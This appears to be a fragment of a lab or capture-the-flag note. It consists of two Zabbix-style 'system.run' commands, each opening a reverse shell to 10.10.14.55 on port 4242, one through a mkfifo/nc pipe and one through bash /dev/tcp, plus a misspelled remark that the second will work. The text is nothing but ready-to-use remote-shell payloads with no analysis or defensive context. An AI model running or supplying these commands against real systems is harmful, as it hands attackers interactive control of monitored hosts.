```bash
system.run[/bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.55 4242 >/tmp/f" , nowait]
```

this cyrtanly fill work
```bash
system.run[/bin/bash -c "bash -i >& /dev/tcp/10.10.14.55/4242 0>&1" , nowait]
```